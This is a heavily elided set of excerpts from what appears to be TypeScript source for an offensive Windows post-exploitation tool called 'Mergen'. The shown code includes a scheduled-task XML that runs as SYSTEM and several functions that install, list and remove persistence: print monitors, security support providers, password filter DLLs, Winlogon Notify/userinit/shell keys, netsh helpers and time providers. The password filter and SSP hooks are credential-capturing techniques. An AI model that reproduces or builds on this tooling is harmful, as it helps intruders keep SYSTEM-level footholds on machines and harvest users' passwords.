...
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43AEB5B}" name="Mergen-Task" image="0" changed="$now" uid="$taskGuid" userContext="0" removePolicy="0">
        <Properties action="C" name="Mergen-Task" runAs="NT AUTHORITY\\SYSTEM" logonType="S4U">
            <Task version="1.2">
                <Principals>
                    <Principal id="Author">
...
export async function printMonitorPersist(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const name = argVal(args, "--name") || "MergenMon"
...
export async function sspPersist(args: string[], timeout: number): Promise<HookResult> {
  ...
  const name = argVal(args, "--name") || "MergenSSP"
...
export async function passwordFilter(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const dll = argVal(args, "--dll")
  const filterName = argVal(args, "--name") || "MergenPF"
  const findings: Finding[] = []
...
export async function winlogonPersist(args: string[], timeout: number): Promise<HookResult> {
  ...
  if (activeExec === "cmd" || activeExec === "bat") {
    ...
    if (action === "install") {
      ...
      if (key === "notify") {
        const notifyKey = `${winlogonCmd}\\Notify\\Mergen`
    ...
    if (action === "restore") {
      ...
      if (key === "notify") await cmd(`reg delete "${winlogonCmd}\\Notify\\Mergen" /f`, timeout)
...
`
    ...
    if (key === "notify") {
      const script = `
$notifyPath = '${winlogonPath}\\Notify\\Mergen'
    ...
    const script =
      key === "userinit"
        ...
        : key === "shell"
          ...
          : `Remove-Item '${winlogonPath}\\Notify\\Mergen' -Recurse -Force -ErrorAction SilentlyContinue; Write-Output "[+] Notify key removed"`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }
...
export async function netshHelper(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const dll = argVal(args, "--dll")
  const helperName = argVal(args, "--name") || "MergenHelper"
  const findings: Finding[] = []
...
export async function timeProvider(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const dll = argVal(args, "--dll")
  const providerName = argVal(args, "--name") || "MergenTimeProvider"
  const findings: Finding[] = []
